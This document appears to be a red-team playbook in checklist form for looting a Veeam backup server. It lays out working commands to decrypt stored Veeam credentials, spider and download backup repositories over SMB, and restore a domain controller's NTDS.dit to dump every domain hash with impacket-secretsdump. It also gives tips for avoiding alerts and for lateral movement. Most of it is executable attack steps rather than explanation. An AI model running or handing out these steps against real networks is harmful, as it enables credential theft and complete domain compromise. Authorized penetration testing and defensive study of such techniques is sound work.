# Backup Software Looting (Veeam)

## Before I start
- [ ] Find the Veeam server: nxc/ldap for hosts named *veeam*/*backup*, ports 9392/9401/6160
- [ ] Need local admin ON THE VEEAM SERVER — creds are machine-DPAPI, they don't decrypt anywhere else

## Decrypt stored credentials
.\Veeam-Get-Creds.ps1
nxc smb <VeeamIP> -u '<User>' -p '<Password>' -M veeam
- [ ] Stored creds back up DCs → usually Domain Admin and/or root
- [ ] Version-parse errors on old Veeam → try the legacy PoC / manual registry+SQL route

## Loot backup files
nxc smb <RepoIP> -u '<User>' -p '<Password>' -M spider_plus -o DOWNLOAD_FLAG=True
smbclient //<RepoIP>/backups -U '<User>%<Password>' -c 'recurse; ls' | grep -iE '\.vbk|\.vib'
- [ ] .vbk/.vib for a DC = offline domain compromise, no live-DC noise

## DC backup → NTDS
- [ ] On the Veeam console: guest file restore from a DC restore point → C:\Windows\NTDS\ntds.dit + SYSTEM hive
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
- [ ] Every domain hash, zero alerts on the DC: :Pb golden-silver

## If it fails
- [ ] Can't reach repo files → share perms; spider from the Veeam server's session instead
- [ ] Encrypted backups → the encryption password is often in the Veeam config DB too — Veeam-Get-Creds output again

## Next
- [ ] Recovered service accounts → test everywhere: :Pb lateral-movement
- [ ] Domain hashes → :Pb dpapi for the user-layer secrets they unlock
